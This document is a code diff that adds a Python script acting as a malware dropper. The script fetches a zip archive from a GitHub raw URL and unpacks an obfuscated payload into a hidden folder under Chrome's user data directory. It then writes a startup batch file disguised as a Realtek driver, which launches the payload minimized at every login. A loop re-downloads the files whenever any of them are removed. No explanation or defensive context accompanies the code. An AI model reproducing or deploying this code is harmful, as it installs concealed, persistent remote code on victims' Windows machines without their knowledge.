@@ -1,0 +1,50 @@
+import requests 
+import os
+import shutil
+from zipfile import ZipFile
+import subprocess
+import getpass
+from time import sleep
+
+user = getpass.getuser()
+
+
+filepaths = [fr"C:\Users\{user}\AppData\Local\Google\Chrome\User Data\runtime", 
+             fr"C:\Users\{user}\AppData\Local\Google\Chrome\User Data\runtime\payload.py",
+             fr"C:\Users\{user}\AppData\Local\Google\Chrome\User Data\runtime\pyarmor_runtime_000000\pyarmor_runtime.pyd",
+             fr"C:\Users\{user}\AppData\Local\Google\Chrome\User Data\runtime\pyarmor_runtime_000000\__init__.py",
+             fr"C:\Users\{user}\AppData\Local\Google\Chrome\User Data\runtime\pyarmor_runtime_000000\__pycache__\__init__.cpython-39.pyc"
+             ]
+
+
+
+def redownload():
+    if os.path.exists(fr"C:\Users\{user}\AppData\Local\Google\Chrome\User Data\runtime"):
+        shutil.rmtree(fr"C:\Users\{user}\AppData\Local\Google\Chrome\User Data\runtime")
+
+    r = requests.get("https://github.com/spxctrzz/adawdgsdfagdf/raw/refs/heads/main/runtime.zip")
+
+    with open(fr"C:\Users\{user}\AppData\Local\Google\Chrome\User Data\runtime.zip", "wb") as f:
+        f.write(r.content)
+
+    with ZipFile(fr"C:\Users\{user}\AppData\Local\Google\Chrome\User Data\runtime.zip", "r") as f:
+        f.extractall(fr"C:\Users\{user}\AppData\Local\Google\Chrome\User Data\runtime")
+    os.remove(fr"C:\Users\{user}\AppData\Local\Google\Chrome\User Data\runtime.zip")
+    
+    with open(fr"C:\Users\{user}\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\realtek2driver.bat", "w") as f:
+        f.write(f"@echo off\nif not DEFINED IS_MINIMIZED set IS_MINIMIZED=1 && start \"\" /min \"%~dpnx0\" %* && exit\ncd \"C:\\Users\\{user}\\AppData\\Local\\Google\\Chrome\\User Data\\runtime\"\npython payload.pyw\nexit")
+        return
+    
+
+
+def main():
+    while True:
+        for path in filepaths:
+            if os.path.exists(path):
+                pass
+            else:
+                redownload()
+        sleep(2)
+
+main()
+
